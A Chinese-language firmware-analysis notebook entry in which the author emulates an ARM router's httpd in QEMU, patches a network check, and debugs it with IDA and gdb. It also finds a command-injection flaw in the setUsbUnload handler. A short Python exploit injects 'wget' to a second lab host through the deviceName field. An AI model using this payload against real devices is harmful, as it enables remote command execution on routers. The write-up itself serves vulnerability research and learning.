# 基础信息分析
binwalk解压固件
![[Pasted image 20240801162939.png]]
![[Pasted image 20240801165211.png]]
获取到是squashfs文件系统，且是32位的ARM小端序架构
![[Pasted image 20240801171119.png]]
firmwalker-pro-max获取到是httpd服务
![[Pasted image 20240802104454.png]]
看了一下其启动项，创建挂载了一些文件，复制了两个文件夹，这个平时分析不常见特别注意一下
# user模拟固件
先用user模式启动一下，`--strace`: 启用系统调用跟踪。
![[Pasted image 20240801172122.png]]
![[Pasted image 20240801172041.png]]
发现没起来httpd服务，卡在了welcome to...，去IDA查看一下报错信息
![[Pasted image 20240801172253.png]]
定位到这里后，下个断点动态调试看一下是哪里有问题
![[Pasted image 20240801173325.png]]
加个端口再运行一下
```bash
sudo chroot . ./qemu-arm-static -g 9999 ./bin/httpd
```
![[Pasted image 20240801173849.png]]
用IDA连接后，运行到断点处，发现一直在三个框转圈循环跳不出来，那么httpd起不来就是这里的问题了，去查了一下这里应该是在检查硬件启动的网络，由于我们是模拟的所以一直就会卡在这里，故需要patch一下跳过这里，由于是R3跟0比较，而R3又是R0赋值的，在check_network函数return的值为0，故直接给R3赋值个1，使其绕过
![[Pasted image 20240802165617.png]]
把patch完的httpd二进制文件再放回bin目录下（这里最好不要改名，因为我改了名出了些问题，把原来的httpd做个备份以防万一就好）
这里再再次启动httpd，发现web端还是打不开还是有问题，再看一下错误信息，ip地址应该是有个初始化
![[Pasted image 20240802101307.png]]
去IDA查询
![[Pasted image 20240802101449.png]]
![[Pasted image 20240802101925.png]]
交叉引用追溯到这里，ip是通过v8传来的，而v8经过了inet_ntoa函数处理了sa_data[2]得到
```
`inet_ntoa` 将一个 `struct in_addr` 类型的结构体中的 IP 地址转换为人类可读的字符串形式（点分十进制）。这个函数通常用于调试和日志记录，以便以一种直观的方式显示 IP 地址。
```
再去看一下上层调用，发现又是对a1判断后对sa_data[2]赋值
![[Pasted image 20240802102509.png]]
![[Pasted image 20240802102640.png]]
再向上调用，发现这里的v8就是刚刚传过去的a1，而v8是g_lan_ip，是个全局变量
```
g_lan_ip可能是一个全局变量，用于存储设备或主机在局域网中的 IP 地址。这个变量通常在初始化时被赋值，并在整个程序中使用。
```
所以我们要去配置一个网口为br0的
![[Pasted image 20240801185116.png]]
至于这里的br0，还得请教一下轩尼诗道_burp师傅了
![[Pasted image 20240802103836.png]]
再再再次启动，发现访问到了是没有界面
![[Pasted image 20240802103945.png]]
基础分析中我们说到，启动项中复制了两个文件，其中有一个是web端存放着的html等文件，故照葫芦画瓢，执行启动项的这条命令
```bash
cp -rf ./weroot_ro/* ./webroot/
```
![[Pasted image 20240802105446.png]]
![[Pasted image 20240802105526.png]]
终于有了界面

# 系统模拟固件
现在宿主机中配置网口为tap0
```bash
sudo tunctl -t tap0 -u `whoami`
sudo ifconfig tap0 10.10.10.2/24
```
![[Pasted image 20240801175609.png]]
启动qemu虚拟机
```bash
sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
```
在虚拟机中配置网口
```bash
# 创建桥接接口 br0
sudo ip link add br0 type bridge
# 将 eth0 添加到桥接 br0
sudo ip link set eth0 master br0
# 激活桥接接口 br0 和物理接口 eth0
sudo ip link set br0 up
sudo ip link set eth0 up
# 为桥接接口 br0 分配 IP 地址
sudo ifconfig br0 10.10.10.3/24
# 移除 eth0 的 IP 地址
sudo ifconfig eth0 0.0.0.0
```
![[Pasted image 20240801192224.png]]
开启HTTPServer服务，把打包好的固件文件传到qemu虚拟机
![[Pasted image 20240801191309.png]]
![[Pasted image 20240801192322.png]]
```bash
#挂载本地环境
mount --bind /proc /proc
mount --bind /dev /dev
mount --bind /sys /sys
#启动httpd服务
cd squashfs-root
chroot . sh
httpd
```
![[Pasted image 20240801192822.png]]
![[Pasted image 20240802113751.png]]
# 漏洞分析
在IDA搜索了system危险函数，找到dosystem函数，看交叉引用发现很多，一个个分析
主要是学习动态调试，故也不一一分析
在formsetUsbUnload函数中，执行命令v3是sub_2ba8c函数处理了
![[Pasted image 20240802172708.png]]
追进去看也只是些判断，并没有发现过滤什么，存在命令执行漏洞
![[Pasted image 20240802172828.png]]
![[Pasted image 20240802172835.png]]
在web端找到漏洞点抓包，发包测试，成功（学习动调，不具体分析先）
![[Pasted image 20240802120607.png]]
![[Pasted image 20240802120547.png]]
# exp
```
import requests

url = "http://10.10.10.3:80/goform/setUsbUnload"
Cookies = {"password": " "}
Headers = {"Origin": "http://10.10.10.3", "Referer": "http://10.10.10.3/status_usb.html"}
Data = {"deviceName": "undefined;wget http://10.10.10.2:8000/123"}
requests.post(url, headers=Headers,cookies=Cookies, data=Data)
```
# 动态调试
把gdbserver对应的版本传到qemu虚拟机中，并且把权限改掉
![[Pasted image 20240802144854.png]]
![[Pasted image 20240802144945.png]]
启动httpd服务，再另起一个终端，ssh root@10.10.10.3 查看进程
![[Pasted image 20240802160752.png]]
这里调试 --attach 3140 附加进程 3140
在宿主机中打开gdb-multiarch bin/httpd，进去后设置一些参数
```bash
#设置arm架构
set architecture arm
#设置小端序
set endian little
#加载动态库
set solib-search-path lib/
set sysroot lib/

1. set sysroot lib/:
   - 这个命令设置了系统根目录（sysroot），用于指定查找系统库的路径。它通常用于交叉调试，告诉 GDB 在 `lib/` 目录中查找库文件。

2. set solib-search-path lib:
   - 这个命令指定了共享库的搜索路径。GDB 会在这个路径中查找动态链接库，以便在调试时能够加载相关的共享库。
```
![[Pasted image 20240802160824.png]]
先在另一个终端中运行我们写的exp，在我们上述分析的函数下断点，追踪过来，进入函数发现我们命令已经存在寄存器上了
![[Pasted image 20240802161849.png]]
我们传入的参数最终是要和cfm命令中的%s拼接
![[Pasted image 20240802161931.png]]
这里可以看到r3寄存器存了我们传的命令，r0是格式化字符串打印，r1是51，r2是3
而r0-r2是写死的不可控，只有r3，%s的地方是我们可以通过burp发包可控的
![[Pasted image 20240802162017.png]]
![[Pasted image 20240802162200.png]]
最后R0,R1,R3寄存器清空，R2寄存器拼接了51，3，以及我们输入的命令